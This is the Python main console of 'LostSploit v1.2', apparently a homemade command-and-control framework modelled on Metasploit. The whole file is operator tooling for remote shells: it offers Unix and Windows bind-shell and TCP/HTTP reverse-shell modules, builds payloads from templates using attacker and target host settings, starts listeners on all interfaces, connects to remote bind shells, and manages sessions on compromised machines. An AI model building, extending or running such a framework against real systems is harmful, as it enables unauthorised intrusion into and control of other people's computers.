import os
from build import build 
import sys
from select import select
import queue
from src.modules.http_listener import NOTIFY_QUEUE
from src.modules.database import init_db, get_active_sessions
from src.modules.session_manager import start_reverse_handler, connect_to_bind_shell, interact_with_session,start_http_handler
#banner = """
#  _           _   ___      _     _ _   
# | |   ___ __| |_/ __|_ __| |___(_) |_ 
# | |__/ _ (_-<  _\\__ \\ '_ \\ / _ \\ |  _|
# |____\\___/__/\\__|___/ .__/_\\___/_|\\__|
#                     |_|               
#    """
banner = """
⠀⠀⠀⠀⠀⠀⣴⣶⣶⣶⣶⣮⣽⣗⣢⠤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⠿⠿⢿⣿⣿⣶⣮⣽⣒⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⢻⣿⣿⣮⡟⣤⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡄⠀⠀⠀⠀⠀⠀⠈⠙⠛⠿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⠗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣴⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣀⠀⠀
⠀⠀⠀⢀⣾⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡆⠀
⠀⠀⢰⣿⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡀
⠀⢠⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣾⣿⣦⡀⠀⠀⠀⠀⠀⠀⢻⣧
⠀⣿⣿⠃⠀⠀⠀⢀⣴⣾⣿⣿⣷⠄⠀⠀⠀⢰⠛⠟⠛⠿⣿⡿⣇⠀⠀⠀⠀⠀⠸⣿
⢸⣿⡏⠀⠀⠀⠀⣾⣿⠏⠉⠈⠁⠀⠀⠀⠀⠈⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⣿
⢸⣿⡇⠀⠀⠀⠠⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡇⠀⠀⠀⠀⠀⠀⠀⣿
⢸⣿⣇⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡇⠀⠀⠀⠀⠀⠀⢰⡇
⠘⣿⣿⡄⠀⠀⠀⢸⠃⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣬⣴⡇⠀⠀⠀⠀⠀⢠⣿⠃
⠀⠙⣿⣷⣄⠀⠀⢸⡀⠘⢿⣷⣤⣀⣀⣠⣤⣤⣴⣾⡿⠟⠁⠁⠀⠀⠀⠀⣴⡿⠃⠀
⠀⠀⠈⢿⣿⣦⠀⢸⠀⠀⢀⡟⠻⠟⣿⠿⠿⠿⡿⠉⠀⠀⠀⠀⠀⠀⣀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣼⣀⠀⠸⡇⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠿⣿⣷⣦⣄⣀⣀⣿⡀⣀⣀⣀⣤⣴⣶⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠛⠠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡇⠀LostSploit⠀v1.2
"""
print(banner)
init_db()
current_module = None
modules = {"unix/bindshell_tcp": {"date": "08.08.2026","description": "TCP bind shell","template": "src/templates/template_unix_bindshell.py","type": "bind","type_conn": "tcp"},
           "unix/revshell_tcp": {"date": "08.08.2026","description": "TCP reverse shell","template": "src/templates/template_unix_revshell.py","type": "reverse","type_conn": "tcp"},
           "win/bindshell_tcp": {"date": "29.08.2026","description": "TCP bind shell","template": "src/templates/template_win_bindshell.py","type": "bind","type_conn": "tcp"},
           "unix/revshell_http": {"date": "04.09.2026","description": "HTTP reverse shell","template": "src/templates/template_unix_revshell_http.py","type": "reverse","type_conn": "http"}
}
context = {"LHOST": "","LPORT": "","RHOST": "","RPORT": ""}
def print_session():
    sessions = get_active_sessions()
    if not sessions:
        print("no active sessions.")
        return
    print(f"{'ID':<5} {'Type':<10} {'target address':<20}")
    print("-" * 35)
    for sid, stype, ip, port in sessions:
        print(f"{sid:<5} {stype:<10} {ip}:{port}")
    print()
def non_blocking_input(prompt_string):
    try:
        sys.stdout.write(prompt_string)
        sys.stdout.flush()
        buffer = ""
        while True:
            while not NOTIFY_QUEUE.empty():
                try:
                    msg = NOTIFY_QUEUE.get_nowait()
                    sys.stdout.write(f"{msg}\n")
                    sys.stdout.write(prompt_string)
                    sys.stdout.flush()
                except queue.Empty:
                    break
            rlist, _, _ = select([sys.stdin],[],[],0.2)
            if rlist:
                line = sys.stdin.readline()
                return line.strip()
    except KeyboardInterrupt:
        print("\n[-] Enter 'exit' to quit.")
while True:
    prompt = f"({current_module})lsf> " if current_module else "lsf> "
    inp = non_blocking_input(prompt)
    if not inp:
        continue
    parts = inp.split(maxsplit=2)
    command = parts[0]
    if command == 'exit':
        break

    elif command == "help":
        if not current_module:
            print("show modules\nuse <module>")
        elif modules[current_module]["type"] == "bind":
            print("build\nconnect\nback")
        elif modules[current_module]["type"] == "reverse":
            print("build\nlisten\nback")

    elif inp == "show options":
        if not current_module:
            print("[!] Please select module")
        elif modules[current_module]["type"] == "bind":
            print(f"RHOST   {context['RHOST']}\nRPORT   {context['RPORT']}\nbuild\nconnect")
        elif modules[current_module]["type"] == "reverse":
            print(f"LHOST   {context['LHOST']}\nLPORT   {context['LPORT']}\nbuild\nconnect")
        else:
            print(f"LHOST   {context['LHOST']}\nLPORT   {context['LPORT']}\nbuild\nlisten")

    elif inp == 'show modules':
        print(f"id   Name                           Date               Description")
        print('-' * 80)
        for index,(name,desc) in enumerate(modules.items(),1):
            print(f"{index:<5}{name:<31}{desc['date']:<19}{desc['description']}")

    elif command == "use" and len(parts) > 1:
        chosen_module = parts[1]
        if chosen_module in modules:
            current_module = chosen_module
            print(f"switched to: {current_module}")
        else:
            print(f"Error: module {chosen_module} not found")

    elif command == 'back':
        if current_module:
            current_module = None
        else:
            print("You are not using any module.")

    elif command == "set" and len(parts) == 3:
        var_name = parts[1]
        var_value = parts[2]
        if var_name in context:
            context[var_name] = var_value
            print(f"{var_name} > {var_value}")
        else:
            print(f"Unknown variable: {var_name}")

    elif command == 'build':
        if not current_module:
            print("Error: No module selected.")
            continue
        template_path = modules[current_module]["template"]
        base_name = os.path.basename(template_path)
        if modules[current_module]["type"] == "bind":
            build(base_name,template_path,context["RHOST"],context["RPORT"])   
        else:
            build(base_name,template_path,context["LHOST"],context["LPORT"])     
    elif command == 'sessions':
        print_session()
    elif command == 'interact' and len(parts) > 1:
        try: 
            sid = int(parts[1])
            interact_with_session(sid,modules,current_module)
        except ValueError:
            print("Error: Session ID must be an integer (e.g., interact 1)")

    elif command == 'listen':
        if not context.get("LPORT"):
            print("Error: LPORT is not set. Use 'set LPORT <port>'")
            continue
        try:
            if modules[current_module]["type_conn"] == "tcp":
                port = int(context["LPORT"])
                start_reverse_handler('0.0.0.0',port)
                print(f"[*] Reverse TCP Handler started on 0.0.0.0:{port}")
            elif modules[current_module]["type_conn"] == "http":
                port = int(context["LPORT"])
                start_http_handler('0.0.0.0',port)
        except ValueError:
            print("Error: LPORT must be a valid port number.")

    elif command == 'connect':
        if not context["RHOST"] or not context["RPORT"]:
            print("Error: RHOST and RPORT must be set to connect to a bind shell.")
            continue
        try:
            ip = context["RHOST"]
            port = int(context["RPORT"])
            print(f"[*] Attempting to connect to bind shell at {ip}:{port}...")
            connect_to_bind_shell(ip, port)
        except ValueError:
            print("Error: RPORT must be a valid port number.")
    else:
        print(f"Unknown command: '{command}'. Type 'help' for options.")